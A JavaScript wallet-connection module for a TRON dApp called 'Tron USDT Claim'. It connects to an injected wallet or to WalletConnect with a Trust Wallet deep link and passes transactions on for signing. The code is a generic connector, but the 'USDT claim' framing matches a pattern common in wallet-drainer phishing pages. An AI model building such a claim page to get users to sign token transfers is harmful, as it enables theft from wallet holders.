import { UniversalProvider } from '@walletconnect/universal-provider';
import { WalletConnectModal } from '@walletconnect/modal';

const WC_PROJECT_ID = process.env.NEXT_PUBLIC_WC_PROJECT_ID;
const TRON_CHAIN = 'tron:0x2b6653dc';

class WalletManager {
    constructor() {
        this.provider = null;
        this.modal = null;
        this.isMobile = typeof window !== 'undefined' && /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    }

    async initWC() {
        if (this.provider) return;
        if (!WC_PROJECT_ID) {
            throw new Error('Missing NEXT_PUBLIC_WC_PROJECT_ID in environment');
        }
        this.provider = await UniversalProvider.init({
            projectId: WC_PROJECT_ID,
            metadata: {
                name: 'Tron USDT Claim',
                description: 'Secure TRON Wallet Connection',
                url: typeof window !== 'undefined' ? window.location.origin : '',
                icons: ['https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/info/logo.png'],
            },
        });

        this.modal = new WalletConnectModal({
            projectId: WC_PROJECT_ID,
            chains: [TRON_CHAIN],
        });
    }

    async pollForInjected(maxMs = 2000) {
        const getInjected = () => {
            // Priority: Trust Wallet Tron -> TronLink -> Generic Tron
            const p = window.trustwallet?.tron || window.tronWeb || window.tron || window.tronLink;
            if (p?.defaultAddress?.base58 || p?.ready) return p;
            return null;
        };

        let p = getInjected();
        if (p) return p;

        const steps = Math.ceil(maxMs / 500);
        for (let i = 0; i < steps; i++) {
            await new Promise(r => setTimeout(r, 500));
            p = getInjected();
            if (p) return p;
        }
        return null;
    }

    async connect() {
        // 1. Try injected provider (DApp Browser / Extension)
        const injected = await this.pollForInjected();
        if (injected) {
            try {
                if (injected.request) {
                    await injected.request({ method: 'tron_requestAccounts' });
                }
            } catch (e) {
                console.warn('Injected connection request failed:', e);
            }

            const address = injected.defaultAddress?.base58 || injected.address;
            if (!address) throw new Error('Could not retrieve address from injected provider');

            return {
                address,
                type: 'injected',
                sign: async (tx) => {
                    // Standard injected signTransaction
                    return await injected.signTransaction(tx);
                },
            };
        }

        // 2. Fallback to WalletConnect v2 (Mobile Browser)
        await this.initWC();
        return new Promise((resolve, reject) => {
            // Handle URI for deep linking
            this.provider.on('display_uri', (uri) => {
                if (this.isMobile) {
                    window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
                } else {
                    this.modal.openModal({ uri });
                }
            });

            // Configure namespaces exactly as requested for Trust Wallet compatibility
            const optionalNamespaces = {
                tron: {
                    chains: [TRON_CHAIN],
                    methods: ['tron_signTransaction', 'tron_signMessage'],
                    events: [],
                }
            };

            this.provider.connect({
                optionalNamespaces,
                requiredNamespaces: {} // Use optional to avoid method rejection
            })
                .then((session) => {
                    this.modal.closeModal();

                    const account = session.namespaces.tron.accounts[0];
                    const address = account.split(':').pop();

                    resolve({
                        address,
                        type: 'walletconnect',
                        sign: async (tx) => {
                            // FIX: Trust Wallet expects params as an array [transaction]
                            const result = await this.provider.request({
                                method: 'tron_signTransaction',
                                params: [tx], // Array format as requested
                            }, TRON_CHAIN);

                            // Parse result if it's a string
                            return typeof result === 'string' ? JSON.parse(result) : (result.transaction || result);
                        },
                    });
                })
                .catch(err => {
                    this.modal.closeModal();
                    reject(err);
                });
        });
    }
}

export const walletManager = new WalletManager();
